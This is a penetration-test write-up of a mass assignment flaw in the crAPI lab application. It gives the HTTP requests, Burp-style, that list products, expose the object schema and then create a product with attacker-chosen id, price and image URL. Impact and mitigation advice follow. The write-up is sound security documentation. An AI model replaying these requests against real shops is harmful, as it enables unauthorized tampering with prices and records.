## Vulnerability Metadata



| Field               | Value                                                                                   |     |
| ------------------- | --------------------------------------------------------------------------------------- | --- |
| Vulnerability Type  | Mass Assignment                                                                         |     |
| CWE                 | CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes |     |
| CVSS v3.1           | 8.1 (High)                                                                              |     |
| Vulnerable Endpoint | `/workshop/api/shop/products`                                                           |     |
| HTTP Method         | POST                                                                                    |     |
|                     |                                                                                         |     |


---  
  
## Description  
  
This finding covers the identification, exploitation, and mitigation of a **Mass Assignment** vulnerability within the crAPI shop functionality.  
  
Mass Assignment occurs when an application automatically binds user-supplied parameters to internal object properties without properly restricting which fields can be modified. As a result, attackers may manipulate sensitive attributes that were never intended to be exposed through the API.  
  
During testing, it was discovered that the shop product management API accepts arbitrary JSON attributes and directly maps them to backend product objects. By modifying the request body and supplying additional object properties, an attacker can create or modify products with unauthorized values such as custom names, manipulated prices, negative values, or externally hosted images.  
  
This behavior demonstrates insufficient server-side validation and a lack of attribute-level authorization controls.  
  
---
## Vulnerable Instance  
  
```http  
POST /workshop/api/shop/products HTTP/1.1  
Host: localhost:8888  
```  
  
---
## Proof of Concept  
  
### Step 1 – Access the Shop Functionality  
  
Navigate to the Shop section of crAPI and intercept the request responsible for retrieving product information.  
  
```http  
GET /workshop/api/shop/products?limit=30&offset=0 HTTP/1.1  
Host: localhost:8888  
Authorization: Bearer [JWT_TOKEN]  
```


![](Attachments/Pasted%20image%2020260602110825.png)

Response:  
  
```json  
{  
"products": [  
{  
"id": 2,  
"name": "Wheel",  
"price": "10.00",  
"image_url": "images/wheel.svg"  
},  
{  
"id": 1,  
"name": "Seat",  
"price": "10.00",  
"image_url": "images/seat.svg"  
}  
]  
}  
```  
  
The product listing endpoint discloses the complete object structure used by the backend application, including editable attributes such as `id`, `name`, `price`, and `image_url`.

This information can be leveraged to construct custom requests targeting the product management endpoint. 
  
### Step 2 – Create and Manipulate Product Objects  
  
Using Burp Suite Repeater, a POST request was sent to the product management endpoint by reusing the object structure disclosed by the product listing API.  
  
Initial request:  
  
```http  
POST /workshop/api/shop/products HTTP/1.1  
Host: localhost:8888  
Content-Type: application/x-www-form-urlencoded  
  
{  
"id": 2,  
"name": "Wheel",  
"price": "10.00",  
"image_url": "images/wheel.svg"  
}  
```  
  
The application initially returned a validation error indicating that required object properties were missing.
The response disclosed the exact fields expected by the backend object model:  
  
```json  
{  
"name": [  
"This field is required."  
],  
"price": [  
"This field is required."  
],  
"image_url": [  
"This field is required."  
]  
}  
```  
  
This behavior assists an attacker in identifying the internal object structure used by the application.  
 When the request was replayed using an incorrect content type, the application returned a validation error disclosing the exact fields required by the backend model.

This behavior assists an attacker in understanding the internal object schema and facilitates the construction of malicious requests.
After changing the request header from:  
  
```http  
Content-Type: application/x-www-form-urlencoded  
```  
  
to:  
  
```http  
Content-Type: application/json  
```  
  
After modifying the request content type to `application/json`, the backend accepted and processed attacker-controlled object properties without enforcing attribute restrictions.  


![](Attachments/Pasted%20image%2020260602111535.png)

---
### Step 4 – Successful Mass Assignment Exploitation

After identifying the required object properties and switching the request format to JSON, arbitrary product attributes were modified and accepted by the backend application.

The attacker changed multiple properties, including:

- Product identifier (`id`)
- Product name (`name`)
- Product price (`price`)
- Product image URL (`image_url`)

The server returned an HTTP 200 OK response containing the attacker-supplied values, confirming that user-controlled properties are directly mapped to internal backend objects without sufficient validation or attribute restrictions.

This behavior demonstrates a Mass Assignment vulnerability, allowing unauthorized manipulation of application data and business objects.
  
```json  
{  
"id": 3,  
"name": "Animation",  
"price": "50.00",  
"image_url": "https://example.com/custom-image.jpg"  
}  
```  
  
Server Response:  
  
```json  
{  
"id": 3,  
"name": "Animation",  
"price": "50.00",  
"image_url": "https://example.com/custom-image.jpg"  
}  
```  
  
The successful response confirms that user-supplied properties are directly mapped to backend objects without sufficient attribute restrictions or validation controls.


![](Attachments/Pasted%20image%2020260602112130.png)

### Step 4: Confirmed new product 

With the above changes we can add our own products, give negative values etc..
![](Attachments/Pasted%20image%2020260602112317.png)


### Impact

- Unauthorized creation and modification of product records
- Manipulation of business-critical attributes such as pricing and inventory data
- Corruption of application data integrity
- Potential abuse of trust relationships between client and server
- Increased attack surface for privilege escalation and business logic abuse
### Mitigation

- Implement Data Transfer Objects (DTOs) to expose only intended fields
- Apply server-side allowlists for accepted attributes
- Enforce attribute-level authorization controls
- Reject unknown or unexpected properties
- Perform strict input validation on all user-supplied fields
- Separate internal domain models from external API contracts